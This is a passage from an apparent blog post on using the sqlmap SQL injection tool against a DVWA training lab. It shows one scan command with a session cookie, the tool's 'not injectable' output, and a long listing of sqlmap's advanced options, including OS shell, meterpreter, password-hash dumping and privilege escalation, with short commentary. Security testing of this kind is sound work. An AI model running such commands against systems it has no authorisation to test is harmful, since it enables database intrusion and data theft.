+[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is &quot;Y&quot;): a
+
+C:\Users\Felix Ingram\Documents\development\sqlmap [master +1 ~0 -0 !]
+[8+]:&gt;  py -2 .\sqlmap.py --proxy=http://127.0.0.1:8080 -u &quot;http://192.168.253.133/dvwa/vulnerabilities/sqli/?id=Shamus&amp;Submit=Submit#&quot;
+-p id --dbms=mysql --cookie=&quot;PHPSESSID=mc2m3bbdca59a8k3vd81f7kqd1&quot; --banner
+
+    sqlmap/1.0-dev-991cafc - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+... snip ...
+
+[14:05:15] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;
+[14:05:17] [WARNING] GET parameter &#39;id&#39; is not injectable
+[14:05:17] [CRITICAL] all tested parameters appear to be not injectable. Try to increase &#39;--level&#39;/&#39;--risk&#39; values to perform more tests. As heuristic test turned out positive you are strongly advised to continue on with the tests. Please, consider usage of tampering scripts as your target might filter the queries. Also, you can try to rerun by providing either a valid value for option &#39;--string&#39; (or &#39;--regexp&#39;)
+
+[*] shutting down at 14:05:17
+</pre></div>
+
+
+<p>So normal service has been resumed. I posed this question to one of the
+developers and got the rather cryptic hint that the <code>-r</code> option was added as
+people weren't passing the correct options in on the command line. So let's see
+what else we could be using.</p>
+<div class="highlight"><pre>[9+]:&gt; py -2 .\sqlmap.py -hh
+Usage: .\sqlmap.py [options]
+
+Options:
+-h, --help            Show basic help message and exit
+-hh                   Show advanced help message and exit
+--version             Show program&#39;s version number and exit
+-v VERBOSE            Verbosity level: 0-6 (default 1)
+
+Target:
+    At least one of these options has to be provided to set the target(s)
+
+    -d DIRECT           Direct connection to the database
+    -u URL, --url=URL   Target URL (e.g. &quot;www.target.com/vuln.php?id=1&quot;)
+    -l LOGFILE          Parse targets from Burp or WebScarab proxy logs
+    -m BULKFILE         Scan multiple targets enlisted in a given textual file
+    -r REQUESTFILE      Load HTTP request from a file
+    -g GOOGLEDORK       Process Google dork results as target URLs
+    -c CONFIGFILE       Load options from a configuration INI file
+
+Request:
+    These options can be used to specify how to connect to the target URL
+
+    --data=DATA         Data string to be sent through POST
+    --param-del=PDEL    Character used for splitting parameter values
+</pre></div>
+
+
+<p>None of those seem useful.</p>
+<div class="highlight"><pre>    --cookie=COOKIE     HTTP Cookie header
+</pre></div>
+
+
+<p>We're already using this one.</p>
+<div class="highlight"><pre>    --load-cookies=L..  File containing cookies in Netscape/wget format
+    --drop-set-cookie   Ignore Set-Cookie header from response
+    --user-agent=AGENT  HTTP User-Agent header
+    --random-agent      Use randomly selected HTTP User-Agent header
+    --host=HOST         HTTP Host header
+    --referer=REFERER   HTTP Referer header
+    --headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;)
+    --auth-type=ATYPE   HTTP authentication type (Basic, Digest, NTLM or Cert)
+    --auth-cred=ACRED   HTTP authentication credentials (name:password)
+    --auth-cert=ACERT   HTTP authentication certificate (key_file,cert_file)
+    --proxy=PROXY       Use a HTTP proxy to connect to the target URL
+    --proxy-cred=PCRED  HTTP proxy authentication credentials (name:password)
+    --ignore-proxy      Ignore system default HTTP proxy
+    --tor               Use Tor anonymity network
+    --tor-port=TORPORT  Set Tor proxy port other than default
+    --tor-type=TORTYPE  Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)
+    --check-tor         Check to see if Tor is used properly
+    --delay=DELAY       Delay in seconds between each HTTP request
+    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
+    --retries=RETRIES   Retries when the connection timeouts (default 3)
+    --randomize=RPARAM  Randomly change value for given parameter(s)
+    --safe-url=SAFURL   URL address to visit frequently during testing
+    --safe-freq=SAFREQ  Test requests between two visits to a given safe URL
+    --skip-urlencode    Skip URL encoding of payload data
+    --force-ssl         Force usage of SSL/HTTPS
+    --hpp               Use HTTP parameter pollution
+    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
+                        &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)
+</pre></div>
+
+
+<p>None of those seem applicable, unless we're using them already (i.e. --proxy).</p>
+<div class="highlight"><pre><span class="n">Optimization</span><span class="o">:</span>
+    <span class="n">These</span> <span class="n">options</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">optimize</span> <span class="n">the</span> <span class="n">performance</span> <span class="n">of</span> <span class="n">sqlmap</span>
+
+    <span class="o">-</span><span class="n">o</span>                  <span class="n">Turn</span> <span class="n">on</span> <span class="n">all</span> <span class="n">optimization</span> <span class="n">switches</span>
+    <span class="o">--</span><span class="n">predict</span><span class="o">-</span><span class="n">output</span>    <span class="n">Predict</span> <span class="n">common</span> <span class="n">queries</span> <span class="n">output</span>
+    <span class="o">--</span><span class="n">keep</span><span class="o">-</span><span class="n">alive</span>        <span class="n">Use</span> <span class="n">persistent</span> <span class="n">HTTP</span><span class="o">(</span><span class="n">s</span><span class="o">)</span> <span class="n">connections</span>
+    <span class="o">--</span><span class="kc">null</span><span class="o">-</span><span class="n">connection</span>   <span class="n">Retrieve</span> <span class="n">page</span> <span class="n">length</span> <span class="n">without</span> <span class="n">actual</span> <span class="n">HTTP</span> <span class="n">response</span> <span class="n">body</span>
+    <span class="o">--</span><span class="n">threads</span><span class="o">=</span><span class="n">THREADS</span>   <span class="n">Max</span> <span class="n">number</span> <span class="n">of</span> <span class="n">concurrent</span> <span class="n">HTTP</span><span class="o">(</span><span class="n">s</span><span class="o">)</span> <span class="n">requests</span> <span class="o">(</span><span class="k">default</span> <span class="mi">1</span><span class="o">)</span>
+</pre></div>
+
+
+<p>Nope.</p>
+<div class="highlight"><pre><span class="n">Injection</span><span class="o">:</span>
+    <span class="n">These</span> <span class="n">options</span> <span class="n">can</span> <span class="n">be</span> <span class="n">used</span> <span class="n">to</span> <span class="n">specify</span> <span class="n">which</span> <span class="n">parameters</span> <span class="n">to</span> <span class="n">test</span> <span class="k">for</span><span class="o">,</span>
+    <span class="n">provide</span> <span class="n">custom</span> <span class="n">injection</span> <span class="n">payloads</span> <span class="n">and</span> <span class="n">optional</span> <span class="n">tampering</span> <span class="n">scripts</span>
+
+    <span class="o">-</span><span class="n">p</span> <span class="n">TESTPARAMETER</span>    <span class="n">Testable</span> <span class="n">parameter</span><span class="o">(</span><span class="n">s</span><span class="o">)</span>
+</pre></div>
+
+
+<p>Yep.</p>
+<div class="highlight"><pre>    --skip=SKIP         Skip testing for given parameter(s)
+</pre></div>
+
+
+<p>Maybe.</p>
+<div class="highlight"><pre>    --dbms=DBMS         Force back-end DBMS to this value
+</pre></div>
+
+
+<p>Yep.</p>
+<div class="highlight"><pre>    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
+    --os=OS             Force back-end DBMS operating system to this value
+</pre></div>
+
+
+<p>Maybe.</p>
+<div class="highlight"><pre>    --invalid-bignum    Use big numbers for invalidating values
+    --invalid-logical   Use logical operations for invalidating values
+    --no-cast           Turn off payload casting mechanism
+</pre></div>
+
+
+<p>Maybe.</p>
+<div class="highlight"><pre>    --no-escape         Turn off string escaping mechanism
+</pre></div>
+
+
+<p>Maybe.</p>
+<div class="highlight"><pre>    <span class="o">--</span><span class="nx">prefix</span><span class="o">=</span><span class="nx">PREFIX</span>     <span class="nx">Injection</span> <span class="nx">payload</span> <span class="nx">prefix</span> <span class="nx">string</span>
+    <span class="o">--</span><span class="nx">suffix</span><span class="o">=</span><span class="nx">SUFFIX</span>     <span class="nx">Injection</span> <span class="nx">payload</span> <span class="nx">suffix</span> <span class="nx">string</span>
+    <span class="o">--</span><span class="nx">tamper</span><span class="o">=</span><span class="nx">TAMPER</span>     <span class="nx">Use</span> <span class="nx">given</span> <span class="nx">script</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="k">for</span> <span class="nx">tampering</span> <span class="nx">injection</span> <span class="nx">data</span>
+
+<span class="nx">Detection</span><span class="o">:</span>
+    <span class="nx">These</span> <span class="nx">options</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">to</span> <span class="nx">customize</span> <span class="nx">the</span> <span class="nx">detection</span> <span class="nx">phase</span>
+
+    <span class="o">--</span><span class="nx">level</span><span class="o">=</span><span class="nx">LEVEL</span>       <span class="nx">Level</span> <span class="nx">of</span> <span class="nx">tests</span> <span class="nx">to</span> <span class="nx">perform</span> <span class="p">(</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="p">,</span> <span class="k">default</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="o">--</span><span class="nx">risk</span><span class="o">=</span><span class="nx">RISK</span>         <span class="nx">Risk</span> <span class="nx">of</span> <span class="nx">tests</span> <span class="nx">to</span> <span class="nx">perform</span> <span class="p">(</span><span class="mi">0</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span> <span class="k">default</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="o">--</span><span class="nx">string</span><span class="o">=</span><span class="nx">STRING</span>     <span class="nb">String</span> <span class="nx">to</span> <span class="nx">match</span> <span class="nx">when</span> <span class="nx">query</span> <span class="nx">is</span> <span class="nx">evaluated</span> <span class="nx">to</span> <span class="nx">True</span>
+    <span class="o">--</span><span class="nx">not</span><span class="o">-</span><span class="nx">string</span><span class="o">=</span><span class="nx">NOT</span><span class="p">..</span>  <span class="nb">String</span> <span class="nx">to</span> <span class="nx">match</span> <span class="nx">when</span> <span class="nx">query</span> <span class="nx">is</span> <span class="nx">evaluated</span> <span class="nx">to</span> <span class="nx">False</span>
+    <span class="o">--</span><span class="nx">regexp</span><span class="o">=</span><span class="nx">REGEXP</span>     <span class="nx">Regexp</span> <span class="nx">to</span> <span class="nx">match</span> <span class="nx">when</span> <span class="nx">query</span> <span class="nx">is</span> <span class="nx">evaluated</span> <span class="nx">to</span> <span class="nx">True</span>
+    <span class="o">--</span><span class="nx">code</span><span class="o">=</span><span class="nx">CODE</span>         <span class="nx">HTTP</span> <span class="nx">code</span> <span class="nx">to</span> <span class="nx">match</span> <span class="nx">when</span> <span class="nx">query</span> <span class="nx">is</span> <span class="nx">evaluated</span> <span class="nx">to</span> <span class="nx">True</span>
+    <span class="o">--</span><span class="nx">text</span><span class="o">-</span><span class="nx">only</span>         <span class="nx">Compare</span> <span class="nx">pages</span> <span class="nx">based</span> <span class="nx">only</span> <span class="nx">on</span> <span class="nx">the</span> <span class="nx">textual</span> <span class="nx">content</span>
+    <span class="o">--</span><span class="nx">titles</span>            <span class="nx">Compare</span> <span class="nx">pages</span> <span class="nx">based</span> <span class="nx">only</span> <span class="nx">on</span> <span class="nx">their</span> <span class="nx">titles</span>
+
+<span class="nx">Techniques</span><span class="o">:</span>
+    <span class="nx">These</span> <span class="nx">options</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">to</span> <span class="nx">tweak</span> <span class="nx">testing</span> <span class="nx">of</span> <span class="nx">specific</span> <span class="nx">SQL</span> <span class="nx">injection</span>
+    <span class="nx">techniques</span>
+
+    <span class="o">--</span><span class="nx">technique</span><span class="o">=</span><span class="nx">TECH</span>    <span class="nx">SQL</span> <span class="nx">injection</span> <span class="nx">techniques</span> <span class="nx">to</span> <span class="nx">use</span> <span class="p">(</span><span class="k">default</span> <span class="s2">&quot;BEUSTQ&quot;</span><span class="p">)</span>
+    <span class="o">--</span><span class="nx">time</span><span class="o">-</span><span class="nx">sec</span><span class="o">=</span><span class="nx">TIMESEC</span>  <span class="nx">Seconds</span> <span class="nx">to</span> <span class="nx">delay</span> <span class="nx">the</span> <span class="nx">DBMS</span> <span class="nx">response</span> <span class="p">(</span><span class="k">default</span> <span class="mi">5</span><span class="p">)</span>
+    <span class="o">--</span><span class="nx">union</span><span class="o">-</span><span class="nx">cols</span><span class="o">=</span><span class="nx">UCOLS</span>  <span class="nx">Range</span> <span class="nx">of</span> <span class="nx">columns</span> <span class="nx">to</span> <span class="nx">test</span> <span class="k">for</span> <span class="nx">UNION</span> <span class="nx">query</span> <span class="nx">SQL</span> <span class="nx">injection</span>
+    <span class="o">--</span><span class="nx">union</span><span class="o">-</span><span class="kr">char</span><span class="o">=</span><span class="nx">UCHAR</span>  <span class="nx">Character</span> <span class="nx">to</span> <span class="nx">use</span> <span class="k">for</span> <span class="nx">bruteforcing</span> <span class="nx">number</span> <span class="nx">of</span> <span class="nx">columns</span>
+    <span class="o">--</span><span class="nx">union</span><span class="o">-</span><span class="nx">from</span><span class="o">=</span><span class="nx">UFROM</span>  <span class="nx">Table</span> <span class="nx">to</span> <span class="nx">use</span> <span class="k">in</span> <span class="nx">FROM</span> <span class="nx">part</span> <span class="nx">of</span> <span class="nx">UNION</span> <span class="nx">query</span> <span class="nx">SQL</span> <span class="nx">injection</span>
+    <span class="o">--</span><span class="nx">dns</span><span class="o">-</span><span class="nx">domain</span><span class="o">=</span><span class="nx">DNS</span><span class="p">..</span>  <span class="nx">Domain</span> <span class="nx">name</span> <span class="nx">used</span> <span class="k">for</span> <span class="nx">DNS</span> <span class="nx">exfiltration</span> <span class="nx">attack</span>
+    <span class="o">--</span><span class="nx">second</span><span class="o">-</span><span class="nx">order</span><span class="o">=</span><span class="nx">S</span><span class="p">..</span>  <span class="nx">Resulting</span> <span class="nx">page</span> <span class="nx">URL</span> <span class="nx">searched</span> <span class="k">for</span> <span class="nx">second</span><span class="o">-</span><span class="nx">order</span> <span class="nx">response</span>
+
+<span class="nx">Fingerprint</span><span class="o">:</span>
+    <span class="o">-</span><span class="nx">f</span><span class="p">,</span> <span class="o">--</span><span class="nx">fingerprint</span>   <span class="nx">Perform</span> <span class="nx">an</span> <span class="nx">extensive</span> <span class="nx">DBMS</span> <span class="nx">version</span> <span class="nx">fingerprint</span>
+
+<span class="nx">Enumeration</span><span class="o">:</span>
+    <span class="nx">These</span> <span class="nx">options</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">to</span> <span class="nx">enumerate</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">database</span>
+    <span class="nx">management</span> <span class="nx">system</span> <span class="nx">information</span><span class="p">,</span> <span class="nx">structure</span> <span class="nx">and</span> <span class="nx">data</span> <span class="nx">contained</span> <span class="k">in</span> <span class="nx">the</span>
+    <span class="nx">tables</span><span class="p">.</span> <span class="nx">Moreover</span> <span class="nx">you</span> <span class="nx">can</span> <span class="nx">run</span> <span class="nx">your</span> <span class="nx">own</span> <span class="nx">SQL</span> <span class="nx">statements</span>
+
+    <span class="o">-</span><span class="nx">a</span><span class="p">,</span> <span class="o">--</span><span class="nx">all</span>           <span class="nx">Retrieve</span> <span class="nx">everything</span>
+    <span class="o">-</span><span class="nx">b</span><span class="p">,</span> <span class="o">--</span><span class="nx">banner</span>        <span class="nx">Retrieve</span> <span class="nx">DBMS</span> <span class="nx">banner</span>
+    <span class="o">--</span><span class="nx">current</span><span class="o">-</span><span class="nx">user</span>      <span class="nx">Retrieve</span> <span class="nx">DBMS</span> <span class="nx">current</span> <span class="nx">user</span>
+    <span class="o">--</span><span class="nx">current</span><span class="o">-</span><span class="nx">db</span>        <span class="nx">Retrieve</span> <span class="nx">DBMS</span> <span class="nx">current</span> <span class="nx">database</span>
+    <span class="o">--</span><span class="nx">hostname</span>          <span class="nx">Retrieve</span> <span class="nx">DBMS</span> <span class="nx">server</span> <span class="nx">hostname</span>
+    <span class="o">--</span><span class="nx">is</span><span class="o">-</span><span class="nx">dba</span>            <span class="nx">Detect</span> <span class="k">if</span> <span class="nx">the</span> <span class="nx">DBMS</span> <span class="nx">current</span> <span class="nx">user</span> <span class="nx">is</span> <span class="nx">DBA</span>
+    <span class="o">--</span><span class="nx">users</span>             <span class="nx">Enumerate</span> <span class="nx">DBMS</span> <span class="nx">users</span>
+    <span class="o">--</span><span class="nx">passwords</span>         <span class="nx">Enumerate</span> <span class="nx">DBMS</span> <span class="nx">users</span> <span class="nx">password</span> <span class="nx">hashes</span>
+    <span class="o">--</span><span class="nx">privileges</span>        <span class="nx">Enumerate</span> <span class="nx">DBMS</span> <span class="nx">users</span> <span class="nx">privileges</span>
+    <span class="o">--</span><span class="nx">roles</span>             <span class="nx">Enumerate</span> <span class="nx">DBMS</span> <span class="nx">users</span> <span class="nx">roles</span>
+    <span class="o">--</span><span class="nx">dbs</span>               <span class="nx">Enumerate</span> <span class="nx">DBMS</span> <span class="nx">databases</span>
+    <span class="o">--</span><span class="nx">tables</span>            <span class="nx">Enumerate</span> <span class="nx">DBMS</span> <span class="nx">database</span> <span class="nx">tables</span>
+    <span class="o">--</span><span class="nx">columns</span>           <span class="nx">Enumerate</span> <span class="nx">DBMS</span> <span class="nx">database</span> <span class="nx">table</span> <span class="nx">columns</span>
+    <span class="o">--</span><span class="nx">schema</span>            <span class="nx">Enumerate</span> <span class="nx">DBMS</span> <span class="nx">schema</span>
+    <span class="o">--</span><span class="nx">count</span>             <span class="nx">Retrieve</span> <span class="nx">number</span> <span class="nx">of</span> <span class="nx">entries</span> <span class="k">for</span> <span class="nx">table</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
+    <span class="o">--</span><span class="nx">dump</span>              <span class="nx">Dump</span> <span class="nx">DBMS</span> <span class="nx">database</span> <span class="nx">table</span> <span class="nx">entries</span>
+    <span class="o">--</span><span class="nx">dump</span><span class="o">-</span><span class="nx">all</span>          <span class="nx">Dump</span> <span class="nx">all</span> <span class="nx">DBMS</span> <span class="nx">databases</span> <span class="nx">tables</span> <span class="nx">entries</span>
+    <span class="o">--</span><span class="nx">search</span>            <span class="nx">Search</span> <span class="nx">column</span><span class="p">(</span><span class="nx">s</span><span class="p">),</span> <span class="nx">table</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="nx">and</span><span class="o">/</span><span class="nx">or</span> <span class="nx">database</span> <span class="nx">name</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
+    <span class="o">-</span><span class="nx">D</span> <span class="nx">DB</span>               <span class="nx">DBMS</span> <span class="nx">database</span> <span class="nx">to</span> <span class="nx">enumerate</span>
+    <span class="o">-</span><span class="nx">T</span> <span class="nx">TBL</span>              <span class="nx">DBMS</span> <span class="nx">database</span> <span class="nx">table</span> <span class="nx">to</span> <span class="nx">enumerate</span>
+    <span class="o">-</span><span class="nx">C</span> <span class="nx">COL</span>              <span class="nx">DBMS</span> <span class="nx">database</span> <span class="nx">table</span> <span class="nx">column</span> <span class="nx">to</span> <span class="nx">enumerate</span>
+    <span class="o">-</span><span class="nx">U</span> <span class="nx">USER</span>             <span class="nx">DBMS</span> <span class="nx">user</span> <span class="nx">to</span> <span class="nx">enumerate</span>
+    <span class="o">--</span><span class="nx">exclude</span><span class="o">-</span><span class="nx">sysdbs</span>    <span class="nx">Exclude</span> <span class="nx">DBMS</span> <span class="nx">system</span> <span class="nx">databases</span> <span class="nx">when</span> <span class="nx">enumerating</span> <span class="nx">tables</span>
+    <span class="o">--</span><span class="nx">start</span><span class="o">=</span><span class="nx">LIMITSTART</span>  <span class="nx">First</span> <span class="nx">query</span> <span class="nx">output</span> <span class="nx">entry</span> <span class="nx">to</span> <span class="nx">retrieve</span>
+    <span class="o">--</span><span class="nx">stop</span><span class="o">=</span><span class="nx">LIMITSTOP</span>    <span class="nx">Last</span> <span class="nx">query</span> <span class="nx">output</span> <span class="nx">entry</span> <span class="nx">to</span> <span class="nx">retrieve</span>
+    <span class="o">--</span><span class="nx">first</span><span class="o">=</span><span class="nx">FIRSTCHAR</span>   <span class="nx">First</span> <span class="nx">query</span> <span class="nx">output</span> <span class="nx">word</span> <span class="nx">character</span> <span class="nx">to</span> <span class="nx">retrieve</span>
+    <span class="o">--</span><span class="nx">last</span><span class="o">=</span><span class="nx">LASTCHAR</span>     <span class="nx">Last</span> <span class="nx">query</span> <span class="nx">output</span> <span class="nx">word</span> <span class="nx">character</span> <span class="nx">to</span> <span class="nx">retrieve</span>
+    <span class="o">--</span><span class="nx">sql</span><span class="o">-</span><span class="nx">query</span><span class="o">=</span><span class="nx">QUERY</span>   <span class="nx">SQL</span> <span class="nx">statement</span> <span class="nx">to</span> <span class="nx">be</span> <span class="nx">executed</span>
+    <span class="o">--</span><span class="nx">sql</span><span class="o">-</span><span class="nx">shell</span>         <span class="nx">Prompt</span> <span class="k">for</span> <span class="nx">an</span> <span class="nx">interactive</span> <span class="nx">SQL</span> <span class="nx">shell</span>
+    <span class="o">--</span><span class="nx">sql</span><span class="o">-</span><span class="nx">file</span><span class="o">=</span><span class="nx">SQLFILE</span>  <span class="nx">Execute</span> <span class="nx">SQL</span> <span class="nx">statements</span> <span class="nx">from</span> <span class="nx">given</span> <span class="nx">file</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
+
+<span class="nx">Brute</span> <span class="nx">force</span><span class="o">:</span>
+    <span class="nx">These</span> <span class="nx">options</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">to</span> <span class="nx">run</span> <span class="nx">brute</span> <span class="nx">force</span> <span class="nx">checks</span>
+
+    <span class="o">--</span><span class="nx">common</span><span class="o">-</span><span class="nx">tables</span>     <span class="nx">Check</span> <span class="nx">existence</span> <span class="nx">of</span> <span class="nx">common</span> <span class="nx">tables</span>
+    <span class="o">--</span><span class="nx">common</span><span class="o">-</span><span class="nx">columns</span>    <span class="nx">Check</span> <span class="nx">existence</span> <span class="nx">of</span> <span class="nx">common</span> <span class="nx">columns</span>
+
+<span class="nx">User</span><span class="o">-</span><span class="nx">defined</span> <span class="kd">function</span> <span class="nx">injection</span><span class="o">:</span>
+    <span class="nx">These</span> <span class="nx">options</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">to</span> <span class="nx">create</span> <span class="nx">custom</span> <span class="nx">user</span><span class="o">-</span><span class="nx">defined</span> <span class="nx">functions</span>
+
+    <span class="o">--</span><span class="nx">udf</span><span class="o">-</span><span class="nx">inject</span>        <span class="nx">Inject</span> <span class="nx">custom</span> <span class="nx">user</span><span class="o">-</span><span class="nx">defined</span> <span class="nx">functions</span>
+    <span class="o">--</span><span class="nx">shared</span><span class="o">-</span><span class="nx">lib</span><span class="o">=</span><span class="nx">SHLIB</span>  <span class="nx">Local</span> <span class="nx">path</span> <span class="nx">of</span> <span class="nx">the</span> <span class="nx">shared</span> <span class="nx">library</span>
+
+<span class="nx">File</span> <span class="nx">system</span> <span class="nx">access</span><span class="o">:</span>
+    <span class="nx">These</span> <span class="nx">options</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">to</span> <span class="nx">access</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">database</span> <span class="nx">management</span>
+    <span class="nx">system</span> <span class="nx">underlying</span> <span class="nx">file</span> <span class="nx">system</span>
+
+    <span class="o">--</span><span class="nx">file</span><span class="o">-</span><span class="nx">read</span><span class="o">=</span><span class="nx">RFILE</span>   <span class="nx">Read</span> <span class="nx">a</span> <span class="nx">file</span> <span class="nx">from</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span> <span class="nx">file</span> <span class="nx">system</span>
+    <span class="o">--</span><span class="nx">file</span><span class="o">-</span><span class="nx">write</span><span class="o">=</span><span class="nx">WFILE</span>  <span class="nx">Write</span> <span class="nx">a</span> <span class="nx">local</span> <span class="nx">file</span> <span class="nx">on</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span> <span class="nx">file</span> <span class="nx">system</span>
+    <span class="o">--</span><span class="nx">file</span><span class="o">-</span><span class="nx">dest</span><span class="o">=</span><span class="nx">DFILE</span>   <span class="nx">Back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span> <span class="nx">absolute</span> <span class="nx">filepath</span> <span class="nx">to</span> <span class="nx">write</span> <span class="nx">to</span>
+
+<span class="nx">Operating</span> <span class="nx">system</span> <span class="nx">access</span><span class="o">:</span>
+    <span class="nx">These</span> <span class="nx">options</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">to</span> <span class="nx">access</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">database</span> <span class="nx">management</span>
+    <span class="nx">system</span> <span class="nx">underlying</span> <span class="nx">operating</span> <span class="nx">system</span>
+
+    <span class="o">--</span><span class="nx">os</span><span class="o">-</span><span class="nx">cmd</span><span class="o">=</span><span class="nx">OSCMD</span>      <span class="nx">Execute</span> <span class="nx">an</span> <span class="nx">operating</span> <span class="nx">system</span> <span class="nx">command</span>
+    <span class="o">--</span><span class="nx">os</span><span class="o">-</span><span class="nx">shell</span>          <span class="nx">Prompt</span> <span class="k">for</span> <span class="nx">an</span> <span class="nx">interactive</span> <span class="nx">operating</span> <span class="nx">system</span> <span class="nx">shell</span>
+    <span class="o">--</span><span class="nx">os</span><span class="o">-</span><span class="nx">pwn</span>            <span class="nx">Prompt</span> <span class="k">for</span> <span class="nx">an</span> <span class="nx">OOB</span> <span class="nx">shell</span><span class="p">,</span> <span class="nx">meterpreter</span> <span class="nx">or</span> <span class="nx">VNC</span>
+    <span class="o">--</span><span class="nx">os</span><span class="o">-</span><span class="nx">smbrelay</span>       <span class="nx">One</span> <span class="nx">click</span> <span class="nx">prompt</span> <span class="k">for</span> <span class="nx">an</span> <span class="nx">OOB</span> <span class="nx">shell</span><span class="p">,</span> <span class="nx">meterpreter</span> <span class="nx">or</span> <span class="nx">VNC</span>
+    <span class="o">--</span><span class="nx">os</span><span class="o">-</span><span class="nx">bof</span>            <span class="nx">Stored</span> <span class="nx">procedure</span> <span class="nx">buffer</span> <span class="nx">overflow</span> <span class="nx">exploitation</span>
+    <span class="o">--</span><span class="nx">priv</span><span class="o">-</span><span class="nx">esc</span>          <span class="nx">Database</span> <span class="nx">process</span> <span class="nx">user</span> <span class="nx">privilege</span> <span class="nx">escalation</span>
+    <span class="o">--</span><span class="nx">msf</span><span class="o">-</span><span class="nx">path</span><span class="o">=</span><span class="nx">MSFPATH</span>  <span class="nx">Local</span> <span class="nx">path</span> <span class="nx">where</span> <span class="nx">Metasploit</span> <span class="nx">Framework</span> <span class="nx">is</span> <span class="nx">installed</span>
+    <span class="o">--</span><span class="nx">tmp</span><span class="o">-</span><span class="nx">path</span><span class="o">=</span><span class="nx">TMPPATH</span>  <span class="nx">Remote</span> <span class="nx">absolute</span> <span class="nx">path</span> <span class="nx">of</span> <span class="nx">temporary</span> <span class="nx">files</span> <span class="nx">directory</span>
+
+<span class="nx">Windows</span> <span class="nx">registry</span> <span class="nx">access</span><span class="o">:</span>
+    <span class="nx">These</span> <span class="nx">options</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">to</span> <span class="nx">access</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">database</span> <span class="nx">management</span>
+    <span class="nx">system</span> <span class="nx">Windows</span> <span class="nx">registry</span>
+
+    <span class="o">--</span><span class="nx">reg</span><span class="o">-</span><span class="nx">read</span>          <span class="nx">Read</span> <span class="nx">a</span> <span class="nx">Windows</span> <span class="nx">registry</span> <span class="nx">key</span> <span class="nx">value</span>
+    <span class="o">--</span><span class="nx">reg</span><span class="o">-</span><span class="nx">add</span>           <span class="nx">Write</span> <span class="nx">a</span> <span class="nx">Windows</span> <span class="nx">registry</span> <span class="nx">key</span> <span class="nx">value</span> <span class="nx">data</span>
+    <span class="o">--</span><span class="nx">reg</span><span class="o">-</span><span class="nx">del</span>           <span class="nx">Delete</span> <span class="nx">a</span> <span class="nx">Windows</span> <span class="nx">registry</span> <span class="nx">key</span> <span class="nx">value</span>
+    <span class="o">--</span><span class="nx">reg</span><span class="o">-</span><span class="nx">key</span><span class="o">=</span><span class="nx">REGKEY</span>    <span class="nx">Windows</span> <span class="nx">registry</span> <span class="nx">key</span>
+    <span class="o">--</span><span class="nx">reg</span><span class="o">-</span><span class="nx">value</span><span class="o">=</span><span class="nx">REGVAL</span>  <span class="nx">Windows</span> <span class="nx">registry</span> <span class="nx">key</span> <span class="nx">value</span>
+    <span class="o">--</span><span class="nx">reg</span><span class="o">-</span><span class="nx">data</span><span class="o">=</span><span class="nx">REGDATA</span>  <span class="nx">Windows</span> <span class="nx">registry</span> <span class="nx">key</span> <span class="nx">value</span> <span class="nx">data</span>
+    <span class="o">--</span><span class="nx">reg</span><span class="o">-</span><span class="nx">type</span><span class="o">=</span><span class="nx">REGTYPE</span>  <span class="nx">Windows</span> <span class="nx">registry</span> <span class="nx">key</span> <span class="nx">value</span> <span class="nx">type</span>
+
+<span class="nx">General</span><span class="o">:</span>
+    <span class="nx">These</span> <span class="nx">options</span> <span class="nx">can</span> <span class="nx">be</span> <span class="nx">used</span> <span class="nx">to</span> <span class="nx">set</span> <span class="nx">some</span> <span class="nx">general</span> <span class="nx">working</span> <span class="nx">parameters</span>
+
+    <span class="o">-</span><span class="nx">s</span> <span class="nx">SESSIONFILE</span>      <span class="nx">Load</span> <span class="nx">session</span> <span class="nx">from</span> <span class="nx">a</span> <span class="nx">stored</span> <span class="p">(.</span><span class="nx">sqlite</span><span class="p">)</span> <span class="nx">file</span>
+    <span class="o">-</span><span class="nx">t</span> <span class="nx">TRAFFICFILE</span>      <span class="nx">Log</span> <span class="nx">all</span> <span class="nx">HTTP</span> <span class="nx">traffic</span> <span class="nx">into</span> <span class="nx">a</span> <span class="nx">textual</span> <span class="nx">file</span>
